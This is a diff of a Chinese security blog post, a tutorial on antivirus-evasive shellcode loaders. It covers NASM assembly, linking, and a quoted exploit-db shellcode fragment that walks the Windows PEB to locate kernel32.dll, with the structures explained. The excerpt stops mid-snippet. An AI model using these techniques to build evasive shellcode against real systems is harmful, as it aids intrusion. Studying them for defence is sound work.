@@ -1,90 +1,5 @@
-<!DOCTYPE html>
-<html lang=""><head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-
-    <title>静态恶意代码逃逸（第十一课）- 汇编语言编写Shellcode加载器 « 倾旋的博客</title>
-    <meta name="description" content="倾旋的博客">
-    <meta name="author" content='倾旋'>
-
-    <link rel="stylesheet" href="/css/Font-Awesome-5.15.3.all.min.css">
-
-    
-    <link rel="stylesheet" href="/sass/researcher.min.css">
-    
-    
-        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
-    
-
-    
-        
-    
-</head>
-
-    <body>
-<input type="checkbox" id="menu-toggle" class="menu-toggle">
-<label tabindex="0" for="menu-toggle" class="burger"><span></span> <span></span> <span></span><div class="burger-text">Menu</div></label>
-<nav class="main-nav">
-    
-    <ul>
-    
-        
-        
-            <li><a href="/projects/">Projects</a></li>
-        
-            <li><a href="/links/">Links</a></li>
-        
-            <li><a href="/post/">Posts</a></li>
-        
-            <li><a href="/index.xml">Rss</a></li>
-        
-            <li><a href="/tools/">Tools</a></li>
-        
-    
-    </ul>
-   
-</nav>
-<nav><a href="/" class="all-posts-link">‹ All Posts</a></nav><div id="content">
-<div class="container">
-    <h1>静态恶意代码逃逸（第十一课）- 汇编语言编写Shellcode加载器</h1>
-    <p>本节课详细的介绍Shellcode编写的原理、过程，以及使用NASM完成Shellcode加载器的编写，中间穿插了Windows PEB相关的基础知识。</p>
-        <div class = "toc-wrapper">
-            
-<div class="post-toc" id="post-toc">
-<aside>
-    
-    
-    
-    <nav id="TableOfContents">
-  <ul>
-    <li><a href="#0x00-nasm与masm">0x00 NASM与MASM</a></li>
-    <li><a href="#0x01-程序是如何产生的">0x01 程序是如何产生的？</a></li>
-    <li><a href="#0x02-从nasm汇编到exe执行文件">0x02 从NASM汇编到EXE执行文件</a></li>
-    <li><a href="#0x03-shellcode的通用编写思路">0x03 Shellcode的通用编写思路</a></li>
-    <li><a href="#0x03-汇编传递字符串的方式">0x03 汇编传递字符串的方式</a></li>
-    <li><a href="#0x04-shellcode加载器实现">0x04 Shellcode加载器实现</a></li>
-  </ul>
-</nav>
-    
-    
-</aside>
-<a href="#" id="toc-toggle"></a>
-</div>
-
-
-
-        </div>
-    <p>代码将会上传至Github，方便读者下载研究 : <a href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></p>
-<h2 id="0x00-nasm与masm">0x00 NASM与MASM</h2>
-<p><a href="https://www.nasm.us/">NASM</a>与<a href="https://www.masm32.com/">MASM</a>是一个汇编器，能够将汇编代码转换为能够被CPU执行的（目标代码）二进制代码，<a href="https://www.nasm.us/">NASM</a>目前是由H. Peter Anvin提供支持，与MASM相对来说较为自由。MASM是由微软推出，但已经许久没有更新，我开始是从MASM开始看，但是有些书籍会举例很多伪汇编的例子，这不能让我很好的锻炼汇编语言，MASM提供了很多的伪汇编语法，这块我直接跳过，伪汇编代码给我的感觉像是在写C语言。</p>
-<p>MASM的汇编文件可以直接被Visual Studio编译，这里倒是方便很多，but&hellip; 不管是NASM和MASM在学习的过程中都需要乖乖安装环境。很多黑客的Shellcode都是基于NASM环境开发的，Kali Linux中也默认安装了NASM，评判一个Shellcode的好坏就是短小、精炼、干净，NASM是首选。</p>
-<h2 id="0x01-程序是如何产生的">0x01 程序是如何产生的？</h2>
-<p>这个问题可能已经非常常见了，我觉得有一本书能够很好的诠释《程序员的自我修养：链接、装载与库》2016年我还买过这本，当时在学习C语言开发，觉得写的真好。</p>
-<p>一个程序是由编译器编译代码生成的，编译的过程中经过了一系列步骤，涉及到本文知识的主要是程序的链接。首先，一段C语言代码，经过编译器生成Obj文件，这个文件包含了要执行的所有代码，但是这还不够，还缺少生成复合操作系统平台格式的过程，目前系统中能够跑起来的程序都遵循着COFF规范，Linux下是elf，Windows下是exe。</p>
-<h2 id="0x02-从nasm汇编到exe执行文件">0x02 从NASM汇编到EXE执行文件</h2>
-<p>首先，需要写一段测试代码，然后生成目标文件，经过链接器将目标文件进行链接，生成PE文件。</p>
-<p>测试代码：</p>
-<pre tabindex="0"><code>; win.asm
+<!doctype html><html lang><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>静态恶意代码逃逸（第十一课）- 汇编语言编写Shellcode加载器 « 倾旋的博客</title><meta name=description content="倾旋的博客"><meta name=author content="倾旋"><link rel=stylesheet href=/css/Font-Awesome-5.15.3.all.min.css><link rel=stylesheet href=/sass/researcher.min.css><link rel=icon type=image/ico href=https://payloads.online/favicon.ico></head><body><input type=checkbox id=menu-toggle class=menu-toggle>
+<label tabindex=0 for=menu-toggle class=burger><span></span> <span></span> <span></span><div class=burger-text>Menu</div></label><nav class=main-nav><ul><li><a href=/projects/>Projects</a></li><li><a href=/links/>Links</a></li><li><a href=/post/>Posts</a></li><li><a href=/index.xml>Rss</a></li><li><a href=/tools/>Tools</a></li></ul></nav><nav><a href=/ class=all-posts-link>‹ All Posts</a></nav><div id=content><div class=container><h1>静态恶意代码逃逸（第十一课）- 汇编语言编写Shellcode加载器</h1><p>本节课详细的介绍Shellcode编写的原理、过程，以及使用NASM完成Shellcode加载器的编写，中间穿插了Windows PEB相关的基础知识。</p><div class=toc-wrapper><div class=post-toc id=post-toc><aside><nav id=TableOfContents><ul><li><a href=#0x00-nasm与masm>0x00 NASM与MASM</a></li><li><a href=#0x01-程序是如何产生的>0x01 程序是如何产生的？</a></li><li><a href=#0x02-从nasm汇编到exe执行文件>0x02 从NASM汇编到EXE执行文件</a></li><li><a href=#0x03-shellcode的通用编写思路>0x03 Shellcode的通用编写思路</a></li><li><a href=#0x03-汇编传递字符串的方式>0x03 汇编传递字符串的方式</a></li><li><a href=#0x04-shellcode加载器实现>0x04 Shellcode加载器实现</a></li></ul></nav></aside><a href=# id=toc-toggle></a></div></div><p>代码将会上传至Github，方便读者下载研究 : <a href=https://github.com/Rvn0xsy/BadCode>https://github.com/Rvn0xsy/BadCode</a></p><h2 id=0x00-nasm与masm>0x00 NASM与MASM</h2><p><a href=https://www.nasm.us/>NASM</a>与<a href=https://www.masm32.com/>MASM</a>是一个汇编器，能够将汇编代码转换为能够被CPU执行的（目标代码）二进制代码，<a href=https://www.nasm.us/>NASM</a>目前是由H. Peter Anvin提供支持，与MASM相对来说较为自由。MASM是由微软推出，但已经许久没有更新，我开始是从MASM开始看，但是有些书籍会举例很多伪汇编的例子，这不能让我很好的锻炼汇编语言，MASM提供了很多的伪汇编语法，这块我直接跳过，伪汇编代码给我的感觉像是在写C语言。</p><p>MASM的汇编文件可以直接被Visual Studio编译，这里倒是方便很多，but&mldr; 不管是NASM和MASM在学习的过程中都需要乖乖安装环境。很多黑客的Shellcode都是基于NASM环境开发的，Kali Linux中也默认安装了NASM，评判一个Shellcode的好坏就是短小、精炼、干净，NASM是首选。</p><h2 id=0x01-程序是如何产生的>0x01 程序是如何产生的？</h2><p>这个问题可能已经非常常见了，我觉得有一本书能够很好的诠释《程序员的自我修养：链接、装载与库》2016年我还买过这本，当时在学习C语言开发，觉得写的真好。</p><p>一个程序是由编译器编译代码生成的，编译的过程中经过了一系列步骤，涉及到本文知识的主要是程序的链接。首先，一段C语言代码，经过编译器生成Obj文件，这个文件包含了要执行的所有代码，但是这还不够，还缺少生成复合操作系统平台格式的过程，目前系统中能够跑起来的程序都遵循着COFF规范，Linux下是elf，Windows下是exe。</p><h2 id=0x02-从nasm汇编到exe执行文件>0x02 从NASM汇编到EXE执行文件</h2><p>首先，需要写一段测试代码，然后生成目标文件，经过链接器将目标文件进行链接，生成PE文件。</p><p>测试代码：</p><pre tabindex=0><code>; win.asm
 global Start
 
 section .data
@@ -94,159 +9,119 @@ section .text
 Start:
   mov eax,10
   int 3
-</code></pre><p>通过nasm编译：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>nasm <span style="color:#f92672">-</span>f obj win.<span style="color:#66d9ef">asm</span> <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#960050;background-color:#1e0010">生成目标文件</span>
-</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">-</span>f win32 win.<span style="color:#66d9ef">asm</span> <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#960050;background-color:#1e0010">如果要采用</span>VS自带的链接器<span style="color:#960050;background-color:#1e0010">，就使用</span>win32格式<span style="color:#960050;background-color:#1e0010">。</span>
-</span></span></code></pre></div><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-27-19.png" alt=""  />
-  </p></p>
-<p>如果要采用VS自带的链接器，就使用win32格式: <code>nasm -f win32 win.asm</code></p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-27-48.png" alt=""  />
-  </p></p>
-<p>可以看到生成了win.obj，接下来使用链接器进行链接，选择不同的链接器生成的文件会有差异，经过测试w32nasm中提供的alink生成的PE文件和VS自带的Link有很大区别，而且PE的节表名称不能带<code>.</code> ，而Windows平台大部分PE文件的节表名称都是带.的，比较规范，因此这里就采用了VS自带的Link。</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-28-08.png" alt=""  />
-  </p></p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-28-17.png" alt=""  />
-  </p></p>
-<p>将win.exe拖入x32dbg进行调试查看：</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-28-30.png" alt=""  />
-  </p></p>
-<p>汇编生成的文件就是那么简洁&hellip;.</p>
-<h2 id="0x03-shellcode的通用编写思路">0x03 Shellcode的通用编写思路</h2>
-<p>大部分通用的Shellcode编写思路都是从FS寄存器去寻找PEB，然后遍历PEB中的模块列表，从模块列表中寻找Kernel32.dll和ntdll.dll的基址，最终不断从模块中找到API的地址进行调用。</p>
-<p>找一个Exploit-db上的<a href="https://www.exploit-db.com/shellcodes/48116">Shellcode</a>举例：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> mov ebp, esp            ; Set base stack pointer <span style="color:#66d9ef">for</span> new stack<span style="color:#f92672">-</span>frame
-</span></span><span style="display:flex;"><span> sub esp, <span style="color:#ae81ff">0x20</span>           ; Decrement the stack by <span style="color:#ae81ff">32</span> bytes
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>; Find kernel32.dll base address
-</span></span><span style="display:flex;"><span> xor ebx, ebx            ; EBX <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>
-</span></span><span style="display:flex;"><span> mov ebx, [fs:ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>]  ; EBX <span style="color:#f92672">=</span> Address_of_PEB
-</span></span><span style="display:flex;"><span> mov ebx, [ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0xC</span>]      ; EBX <span style="color:#f92672">=</span> Address_of_LDR
-</span></span><span style="display:flex;"><span> mov ebx, [ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1C</span>]     ; EBX <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>st entry in InitOrderModuleList <span style="color:#f92672">/</span> ntdll.dll
-</span></span><span style="display:flex;"><span> mov ebx, [ebx]          ; EBX <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>nd entry in InitOrderModuleList <span style="color:#f92672">/</span> kernelbase.dll
-</span></span><span style="display:flex;"><span> mov ebx, [ebx]          ; EBX <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>rd entry in InitOrderModuleList <span style="color:#f92672">/</span> kernel32.dll
-</span></span><span style="display:flex;"><span> mov eax, [ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x8</span>]      ; EAX <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>kernel32.dll <span style="color:#f92672">/</span> Address of kernel32.dll
-</span></span><span style="display:flex;"><span> mov [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>], eax      ; [EBP<span style="color:#f92672">-</span><span style="color:#ae81ff">0x04</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>kernel32.dll
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>; Find the address of the WinExec Symbol within kernel32.dll
-</span></span><span style="display:flex;"><span>; <span style="color:#f92672">+</span> The hex values will change with different versions of Windows
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>; Find the address of the Export Table within kernel32.dll
-</span></span><span style="display:flex;"><span> mov ebx, [eax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3C</span>]     ; EBX <span style="color:#f92672">=</span> Offset NewEXEHeader  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xF8</span>
-</span></span><span style="display:flex;"><span> add ebx, eax            ; EBX <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>NewEXEHeader        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xF8</span> <span style="color:#f92672">+</span> <span style="color:#f92672">&amp;</span>kernel32.dll
-</span></span><span style="display:flex;"><span> mov ebx, [ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x78</span>]     ; EBX <span style="color:#f92672">=</span> RVA ExportTable      <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x777B0</span> <span style="color:#f92672">=</span> [<span style="color:#f92672">&amp;</span>NewExeHeader <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x78</span>]
-</span></span><span style="display:flex;"><span> add ebx, eax            ; EBX <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>ExportTable         <span style="color:#f92672">=</span> RVA ExportTable <span style="color:#f92672">+</span> <span style="color:#f92672">&amp;</span>kernel32.dll
-</span></span></code></pre></div><p>其中<code>mov ebx, [fs:ebx+0x30]  ; EBX = Address_of_PEB</code> [fs:0x30] 指向的就是PEB地址。</p>
-<p>进程环境块 (Process Environment Block) 是一种用户模式数据结构，应用程序（以及恶意软件扩展）可以使用它来获取加载模块列表、进程启动参数、堆地址、检查程序是否正在运行等信息。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/// PEB structure (winternl.h)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">///////////////////////////////////////////////////////////
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _PEB {
-</span></span><span style="display:flex;"><span>  BYTE                          Reserved1[<span style="color:#ae81ff">2</span>];  <span style="color:#75715e">//  0x00
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">**</span>BYTE                          BeingDebugged; <span style="color:#75715e">//  0x02**
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  BYTE                          Reserved2[<span style="color:#ae81ff">1</span>];  <span style="color:#75715e">//  0x03
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  PVOID                         Reserved3[<span style="color:#ae81ff">2</span>];  <span style="color:#75715e">//  0x04
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">**</span>PPEB_LDR_DATA                 Ldr;           <span style="color:#75715e">//  0x0C**
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
-</span></span><span style="display:flex;"><span>  PVOID                         Reserved4[<span style="color:#ae81ff">3</span>];
-</span></span><span style="display:flex;"><span>  PVOID                         AtlThunkSListPtr;
-</span></span><span style="display:flex;"><span>  PVOID                         Reserved5;
-</span></span><span style="display:flex;"><span>  ULONG                         Reserved6;
-</span></span><span style="display:flex;"><span>  PVOID                         Reserved7;
-</span></span><span style="display:flex;"><span>  ULONG                         Reserved8;
-</span></span><span style="display:flex;"><span>  ULONG                         AtlThunkSListPtr32;
-</span></span><span style="display:flex;"><span>  PVOID                         Reserved9[<span style="color:#ae81ff">45</span>];
-</span></span><span style="display:flex;"><span>  BYTE                          Reserved10[<span style="color:#ae81ff">96</span>];
-</span></span><span style="display:flex;"><span>  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
-</span></span><span style="display:flex;"><span>  BYTE                          Reserved11[<span style="color:#ae81ff">128</span>];
-</span></span><span style="display:flex;"><span>  PVOID                         Reserved12[<span style="color:#ae81ff">1</span>];
-</span></span><span style="display:flex;"><span>  ULONG                         SessionId;
-</span></span><span style="display:flex;"><span>} PEB, <span style="color:#f92672">*</span>PPEB;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/// PEB_LDR_DATA structure (winternl.h)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">///////////////////////////////////////////////////////////
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _PEB_LDR_DATA
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>　ULONG Length;
-</span></span><span style="display:flex;"><span>　BOOLEAN Initialized;
-</span></span><span style="display:flex;"><span>　PVOID SsHandle;
-</span></span><span style="display:flex;"><span>　LIST_ENTRY InLoadOrderModuleList <span style="color:#f92672">-&gt;</span> {
-</span></span><span style="display:flex;"><span>		   <span style="color:#66d9ef">struct</span> _LIST_ENTRY <span style="color:#f92672">*</span>Flink; <span style="color:#75715e">// 4 Bytes
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		   <span style="color:#66d9ef">struct</span> _LIST_ENTRY <span style="color:#f92672">*</span>Blink; <span style="color:#75715e">// 4 Bytes
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
-</span></span><span style="display:flex;"><span>　LIST_ENTRY InMemoryOrderModuleList  <span style="color:#f92672">-&gt;</span> {
-</span></span><span style="display:flex;"><span>		   <span style="color:#66d9ef">struct</span> _LIST_ENTRY <span style="color:#f92672">*</span>Flink; <span style="color:#75715e">// 4 Bytes
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		   <span style="color:#66d9ef">struct</span> _LIST_ENTRY <span style="color:#f92672">*</span>Blink; <span style="color:#75715e">// 4 Bytes
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
-</span></span><span style="display:flex;"><span>　LIST_ENTRY InInitializationOrderModuleList  <span style="color:#f92672">-&gt;</span> {
-</span></span><span style="display:flex;"><span>		   <span style="color:#66d9ef">struct</span> _LIST_ENTRY <span style="color:#f92672">*</span>Flink; <span style="color:#75715e">// 4 Bytes
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		   <span style="color:#66d9ef">struct</span> _LIST_ENTRY <span style="color:#f92672">*</span>Blink; <span style="color:#75715e">// 4 Bytes
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
-</span></span><span style="display:flex;"><span>} PEB_LDR_DATA,<span style="color:#f92672">*</span>PPEB_LDR_DATA;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _LIST_ENTRY {
-</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">struct</span> _LIST_ENTRY <span style="color:#f92672">*</span>Flink; <span style="color:#75715e">// 4 Bytes
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#66d9ef">struct</span> _LIST_ENTRY <span style="color:#f92672">*</span>Blink; <span style="color:#75715e">// 4 Bytes
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} LIST_ENTRY, <span style="color:#f92672">*</span>PLIST_ENTRY, <span style="color:#f92672">*</span>RESTRICTED_POINTER PRLIST_ENTRY;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/// LDR_DATA_TABLE_ENTRY structure (winternl.h)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">///////////////////////////////////////////////////////////
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _LDR_DATA_TABLE_ENTRY
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>	LIST_ENTRY InLoadOrderLinks;
-</span></span><span style="display:flex;"><span>	LIST_ENTRY InMemoryOrderLinks;
-</span></span><span style="display:flex;"><span>	LIST_ENTRY InInitializationOrderLinks;
-</span></span><span style="display:flex;"><span>	PVOID DllBase;
-</span></span><span style="display:flex;"><span>	PVOID EntryPoint;
-</span></span><span style="display:flex;"><span>	ULONG SizeOfImage;
-</span></span><span style="display:flex;"><span>	UNICODE_STRING FullDllName;
-</span></span><span style="display:flex;"><span>	UNICODE_STRING BaseDllName;
-</span></span><span style="display:flex;"><span>	ULONG Flags;
-</span></span><span style="display:flex;"><span>	WORD LoadCount;
-</span></span><span style="display:flex;"><span>	WORD TlsIndex;
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">union</span>
-</span></span><span style="display:flex;"><span>	{
-</span></span><span style="display:flex;"><span>		LIST_ENTRY HashLinks;
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span>
-</span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			PVOID SectionPointer;
-</span></span><span style="display:flex;"><span>			ULONG CheckSum;
-</span></span><span style="display:flex;"><span>		};
-</span></span><span style="display:flex;"><span>	};
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">union</span>
-</span></span><span style="display:flex;"><span>	{
-</span></span><span style="display:flex;"><span>		ULONG TimeDateStamp;
-</span></span><span style="display:flex;"><span>		PVOID LoadedImports;
-</span></span><span style="display:flex;"><span>	};
-</span></span><span style="display:flex;"><span>	_ACTIVATION_CONTEXT<span style="color:#f92672">*</span> EntryPointActivationContext;
-</span></span><span style="display:flex;"><span>	PVOID PatchInformation;
-</span></span><span style="display:flex;"><span>	LIST_ENTRY ForwarderLinks;
-</span></span><span style="display:flex;"><span>	LIST_ENTRY ServiceTagLinks;
-</span></span><span style="display:flex;"><span>	LIST_ENTRY StaticLinks;
-</span></span><span style="display:flex;"><span>} LDR_DATA_TABLE_ENTRY, <span style="color:#f92672">*</span> PLDR_DATA_TABLE_ENTRY;
-</span></span></code></pre></div><p>汇编代码解读：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> mov ebx, [ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1C</span>]     ; EBX <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>st entry in InitOrderModuleList <span style="color:#f92672">/</span> ntdll.dll
-</span></span><span style="display:flex;"><span> mov ebx, [ebx]          ; EBX <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>nd entry in InitOrderModuleList <span style="color:#f92672">/</span> kernelbase.dll
-</span></span><span style="display:flex;"><span> mov ebx, [ebx]          ; EBX <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>rd entry in InitOrderModuleList <span style="color:#f92672">/</span> kernel32.dll
-</span></span><span style="display:flex;"><span> mov eax, [ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x8</span>]      ; EAX <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>kernel32.dll <span style="color:#f92672">/</span> Address of kernel32.dll
-</span></span></code></pre></div><p>EBX+0xC 意味着从PEB的地址开始增加0xC个字节的地址就是指向PPEB_LDR_DATA  Ldr结构体成员的地址，0xC来源于PEB第一个成员到LDR结构体成员的数据宽度，PVOID  Reserved3[2]这样实际上是占用了8个字节，一个指针占用4个字节，2个就是8字节。</p>
-<p>EBX+0x1C意味着从LDR开始增加0x1C个字节的地址，就是指向ntdll.dll的LIST_ENTRY结构体成员LIST_ENTRY InInitializationOrderModuleList的地址，由于LIST_ENTRY 是一个链表结构，它有两个成员，因此整个结构体占用8个字节，后续取地址2次，都是为了遍历这个链表结构。</p>
-<p>0x1C = ULONG Length + BOOLEAN Initialized + PVOID SsHandle + sizeof(LIST_ENTRY InLoadOrderModuleList) + sizeof(LIST_ENTRY InLoadOrderModuleList)</p>
-<p>EBX+0x8 是从InInitializationOrderLinks开始增加8字节，获取指向到DllBase成员的地址，而这个地址就是DLL加载到内存中的基址，有了基址，就可以从DLL的导出表寻找导出函数进行调用了。</p>
-<p>InInitializationOrderModuleList中的DLL加载顺序是固定的，第一个DLL是NTDDLL.dll，第二个是KERNELBASE.dll、第三个是KERNEL32.DLL。</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-29-08.png" alt=""  />
-  </p></p>
-<pre tabindex="0"><code>0:000&gt; dd 00aa41d0
+</code></pre><p>通过nasm编译：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>nasm <span style=color:#f92672>-</span>f obj win.<span style=color:#66d9ef>asm</span> <span style=color:#960050;background-color:#1e0010>#</span> <span style=color:#960050;background-color:#1e0010>生成目标文件</span>
+</span></span><span style=display:flex><span>nasm <span style=color:#f92672>-</span>f win32 win.<span style=color:#66d9ef>asm</span> <span style=color:#960050;background-color:#1e0010>#</span> <span style=color:#960050;background-color:#1e0010>如果要采用</span>VS自带的链接器<span style=color:#960050;background-color:#1e0010>，就使用</span>win32格式<span style=color:#960050;background-color:#1e0010>。</span>
+</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-27-19.png alt></p></p><p>如果要采用VS自带的链接器，就使用win32格式: <code>nasm -f win32 win.asm</code></p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-27-48.png alt></p></p><p>可以看到生成了win.obj，接下来使用链接器进行链接，选择不同的链接器生成的文件会有差异，经过测试w32nasm中提供的alink生成的PE文件和VS自带的Link有很大区别，而且PE的节表名称不能带<code>.</code> ，而Windows平台大部分PE文件的节表名称都是带.的，比较规范，因此这里就采用了VS自带的Link。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-28-08.png alt></p></p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-28-17.png alt></p></p><p>将win.exe拖入x32dbg进行调试查看：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-28-30.png alt></p></p><p>汇编生成的文件就是那么简洁&mldr;.</p><h2 id=0x03-shellcode的通用编写思路>0x03 Shellcode的通用编写思路</h2><p>大部分通用的Shellcode编写思路都是从FS寄存器去寻找PEB，然后遍历PEB中的模块列表，从模块列表中寻找Kernel32.dll和ntdll.dll的基址，最终不断从模块中找到API的地址进行调用。</p><p>找一个Exploit-db上的<a href=https://www.exploit-db.com/shellcodes/48116>Shellcode</a>举例：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span> mov ebp, esp            ; Set base stack pointer <span style=color:#66d9ef>for</span> new stack<span style=color:#f92672>-</span>frame
+</span></span><span style=display:flex><span> sub esp, <span style=color:#ae81ff>0x20</span>           ; Decrement the stack by <span style=color:#ae81ff>32</span> bytes
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>; Find kernel32.dll base address
+</span></span><span style=display:flex><span> xor ebx, ebx            ; EBX <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000000</span>
+</span></span><span style=display:flex><span> mov ebx, [fs:ebx<span style=color:#f92672>+</span><span style=color:#ae81ff>0x30</span>]  ; EBX <span style=color:#f92672>=</span> Address_of_PEB
+</span></span><span style=display:flex><span> mov ebx, [ebx<span style=color:#f92672>+</span><span style=color:#ae81ff>0xC</span>]      ; EBX <span style=color:#f92672>=</span> Address_of_LDR
+</span></span><span style=display:flex><span> mov ebx, [ebx<span style=color:#f92672>+</span><span style=color:#ae81ff>0x1C</span>]     ; EBX <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>st entry in InitOrderModuleList <span style=color:#f92672>/</span> ntdll.dll
+</span></span><span style=display:flex><span> mov ebx, [ebx]          ; EBX <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>nd entry in InitOrderModuleList <span style=color:#f92672>/</span> kernelbase.dll
+</span></span><span style=display:flex><span> mov ebx, [ebx]          ; EBX <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>rd entry in InitOrderModuleList <span style=color:#f92672>/</span> kernel32.dll
